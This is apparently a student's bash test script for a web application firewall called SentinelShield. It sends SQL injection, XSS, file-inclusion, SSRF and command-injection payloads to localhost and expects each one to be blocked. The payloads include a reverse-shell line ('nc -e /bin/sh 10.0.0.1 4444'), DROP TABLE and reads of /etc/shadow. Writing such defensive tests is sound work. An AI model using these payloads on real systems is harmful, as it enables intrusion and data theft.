#!/usr/bin/env bash
# SentinelShield - Student Attack Simulation Script
# Usage: ./test_attacks.sh [target_url]
# Default target: http://localhost:8080

set -euo pipefail

TARGET="${1:-http://localhost:8080}"
PASS=0
FAIL=0
RESULTS=()

echo "============================================"
echo "  SentinelShield - Attack Simulation"
echo "  Target: $TARGET"
echo "============================================"
echo ""

run_test() {
    local desc="$1"
    local expected_code="$2"
    shift 2
    local code
    code=$(curl -s -o /dev/null -w "%{http_code}" "$@" 2>/dev/null || echo "000")
    if [ "$code" = "$expected_code" ]; then
        echo "  [PASS] $desc (HTTP $code)"
        PASS=$((PASS + 1))
        RESULTS+=("PASS|$desc|$code")
    else
        echo "  [FAIL] $desc (expected $expected_code, got $code)"
        FAIL=$((FAIL + 1))
        RESULTS+=("FAIL|$desc|$code")
    fi
}

echo "--- SQL Injection Tests ---"
run_test "Union-based SQLi in query" 403 \
    "$TARGET/?id=1'+UNION+SELECT+*+FROM+users--"
run_test "Boolean-based SQLi (OR 1=1)" 403 \
    "$TARGET/?username=admin'+OR+'1'='1"
run_test "Comment-based SQLi (trailing --)" 403 \
    "$TARGET/?id=1'+OR+1=1--"
run_test "Time-based SQLi (SLEEP)" 403 \
    "$TARGET/?id=1'+SLEEP(5)--"
run_test "Stacked query (DROP)" 403 \
    "$TARGET/?id=1';+DROP+TABLE+users--"

echo ""
echo "--- XSS Tests ---"
run_test "Script tag injection" 403 \
    "$TARGET/?q=<script>alert(1)</script>"
run_test "Event handler (onerror)" 403 \
    "$TARGET/?q=<img+src=x+onerror=alert(1)>"
run_test "JavaScript URI scheme" 403 \
    "$TARGET/?url=javascript:alert(1)"
run_test "Encoded XSS (%3Cscript)" 403 \
    "$TARGET/?q=%3Cscript%3Ealert(1)%3C/script%3E"
run_test "HTML attribute injection" 403 \
    "$TARGET/?q=\"+onfocus=alert(1)+"

echo ""
echo "--- LFI Tests ---"
run_test "Directory traversal (../)" 403 \
    "$TARGET/?file=../../../etc/passwd"
run_test "System file access (/etc/shadow)" 403 \
    "$TARGET/?file=/etc/shadow"
run_test "PHP wrapper (php://filter)" 403 \
    "$TARGET/?file=php://filter/convert.base64-encode/resource=index.php"
run_test "Windows file (boot.ini)" 403 \
    "$TARGET/?file=c:\boot.ini"
run_test "Log file access" 403 \
    "$TARGET/?file=/var/log/apache/access.log"

echo ""
echo "--- SSRF Tests ---"
run_test "Internal IP (127.0.0.1)" 403 \
    "$TARGET/?url=http://127.0.0.1:80"
run_test "Cloud metadata (169.254.169.254)" 403 \
    "$TARGET/?url=http://169.254.169.254/"
run_test "Internal hostname (localhost)" 403 \
    "$TARGET/?url=http://localhost:3000"
run_test "Private IP (192.168.1.1)" 403 \
    "$TARGET/?url=http://192.168.1.1/admin"

echo ""
echo "--- Path Traversal Tests ---"
run_test "Encoded traversal (%2e%2e%2f)" 403 \
    "$TARGET/?path=%2e%2e%2f%2e%2e%2fetc/passwd"
run_test "Double-encoded traversal (%252e)" 403 \
    "$TARGET/?path=%252e%252e%252fetc/passwd"

echo ""
echo "--- Command Injection Tests ---"
run_test "Shell metacharacter (;whoami)" 403 \
    "$TARGET/?cmd=1;whoami"
run_test "Command keyword (ls -la)" 403 \
    "$TARGET/?cmd=ls+-la"
run_test "AND chained command (&&cat)" 403 \
    "$TARGET/?cmd=1&&cat+/etc/passwd"
run_test "Piped reverse shell (|nc)" 403 \
    "$TARGET/?cmd=1|nc+-e+/bin/sh+10.0.0.1+4444"
run_test "Command substitution (\$(whoami))" 403 \
    "$TARGET/?cmd=%24%28whoami%29"
run_test "IFS whitespace bypass" 403 \
    "$TARGET/?cmd=%24%7BIFS%7Dwhoami"
run_test "Interpreter invocation (sh -c)" 403 \
    "$TARGET/?cmd=sh+-c+whoami"
run_test "Windows shell (cmd.exe /c)" 403 \
    "$TARGET/?cmd=cmd.exe+/c+whoami"
run_test "Encoded newline command" 403 \
    "$TARGET/?cmd=1%0a/usr/bin/id"

echo ""
echo "--- Normal Request Tests (should pass) ---"
run_test "Normal homepage request" 200 \
    "$TARGET/"
run_test "Normal search query" 200 \
    "$TARGET/?search=hello+world"
run_test "Normal path request" 200 \
    "$TARGET/about"

echo ""
echo "============================================"
echo "  Results: $PASS passed, $FAIL failed"
echo "============================================"
echo ""
echo "Detailed Results:"
printf "%-7s %-50s %s\n" "STATUS" "TEST" "HTTP"
printf "%-7s %-50s %s\n" "------" "----" "---"
for r in "${RESULTS[@]}"; do
    IFS='|' read -r status desc code <<< "$r"
    printf "%-7s %-50s %s\n" "$status" "$desc" "$code"
done

exit $FAIL
